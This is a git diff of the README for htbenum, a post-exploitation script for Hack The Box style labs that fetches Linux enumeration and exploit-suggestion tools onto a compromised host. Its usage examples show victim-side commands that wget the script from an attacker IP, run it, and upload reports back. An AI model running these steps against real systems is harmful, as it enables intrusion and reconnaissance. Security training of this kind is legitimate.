@@ -6,7 +6,7 @@
 ![GitHub issues](https://img.shields.io/github/issues/SolomonSklash/htbenum.svg?style=flat-square)
 ![Github contributors](https://img.shields.io/github/contributors/SolomonSklash/htbenum.svg?style=flat-square)
 
-This script is designed for use in situations where you do not have internet access on a Linux host and would like to run enumeration and exploit suggestion scripts, such as Hack The Box. I find myself running a similar set of scripts when I get an initial foothold on a Linux box, and this script helps automate the process of downloading the latest version of each enumeration script, making it executable, and running it, as well as sending output to a file for later review.
+This script is designed for use in situations where you do not have internet access on a Linux host and would like to run enumeration and exploit suggestion scripts, such as Hack The Box. I find myself running a similar set of scripts when I get an initial foothold on a Linux box, and this script helps automate the process of downloading the latest version of each enumeration script, making it executable, and running it, as well as sending output to a file for later review. It also has a builtin web server to host the tools and upload reports back to the host machine.
 
 **Pull requests/suggestions welcome!**
 
@@ -22,20 +22,31 @@ This script is designed for use in situations where you do not have internet acc
 * 2 different exploit suggestion tools, including:
     * [linux-soft-exploit-suggester](https://github.com/belane/linux-soft-exploit-suggester)
     * [LES: Linux privilege escalation auditing tool](https://github.com/mzet-/linux-exploit-suggester)
-* Provides an automatic download and update feature
+* Builtin webserver for hosting tools and uploading completed reports
+* Automatic tool download and update feature
 * Custom directory option, for when you know you have access to a specific directory (default is /tmp)
 * Interactive menu lets you choose whether to run only enumeration, only expoit suggestion, or both
 * Checks for Python 2 and 3 and lets you know which scripts will be skipped if Python is missing
 
 ### Usage
 ```
-./htbenum.sh [update] IP port [directory]
+./htbenum.sh [-u] -i IP -p port [-o directory] [-w] [-r]
+
+Example:
+         Host machine: root@kali:~/htbenum# ./htbenum.sh -u
+         Host machine: root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w
+         Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/htbenum.sh
+         Victim machine: www-data@victim:/tmp$ chmod +x ./htbenum.sh
+         Victim machine: www-data@victim:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r
 
  Parameters:
-         update - Download latest versions of each tool, overwriting any existing versions.
-         IP - IP address of the listening web server used to tools for download.
-         port - TCP port of the listening web server used to tools for download.
-         directory - custom download and report creation directory (default is /tmp).
+         -h - View help and usage.
+         -i IP - IP address of the listening web server used for upload and download.
+         -p port - TCP port of the listening web server used for upload and download.
+         -o directory - Custom download and report creation directory (default is /tmp).
+         -w - Start builtin web server for downloading files and uploading reports.
+         -u - Update to the latest versions of each tool, overwriting any existing versions.
+         -r - Upload reports back to the host machine web server (must support PUT requests).
 ```
 
 
@@ -43,7 +54,7 @@ To use htbenum, clone the repo and run the script with the `update` parameter on
 ```
 root@kali:~# git clone https://github.com/SolomonSklash/htbenum
 root@kali:~# cd htbenum
-root@kali:~/htbenum#  ./htbenum.sh update
+root@kali:~/htbenum#  ./htbenum.sh -u
 _   _ ___________ _____ _   _ _   ____  ___
 | | | |_   _| ___ \  ___| \ | | | | |  \/  |
 | |_| | | | | |_/ / |__ |  \| | | | | .  . |
@@ -66,12 +77,16 @@ By Solomon Sklash - solomonsklash@0xfeed.io
 root@kali:~/htbenum#  
 ```
 
-Then, start a webserver in the same directory (Apache, `python3 -m http.server 80`, `python -m SimpleHTTPServer 80`, etc).
+Then, start the builtin web server to host the tools and receive the completed reports. The server requires Python 3. You can use you own web server to host the tools, but it will need to support PUT requests for the report uploads.
 
-Finally, upload the `htbenum.sh` script to your target machine, make it executable, and run it with the IP and port of your host machine, with an optional directory for downloading files and writing report output. For example:
+```
+root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w
+```
+
+Finally, upload the `htbenum.sh` script to your target machine, make it executable, and run it with the IP and port of your host machine, with an optional directory for downloading files and writing report output. You can also optionally upload the reports back to the host machine. For example:
 ```
 www-data@htb:/tmp$ wget http://10.10.99.100/htbenum.sh -O /tmp/htbenum.sh
 www-data@htb:/tmp$ chmod +x ./htbenum.sh
-www-data@htb:/tmp$ ./htbenum.sh 10.10.99.100 80
+www-data@htb:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r
 ```
-Each tool will send its output to a report file in the same directory as the `htbenum.sh` script, or whatever directory is specified by the `directory` parameter.
+Each tool will send its output to a report file in the same directory as the `htbenum.sh` script, or whatever directory is specified by the `-d` parameter.
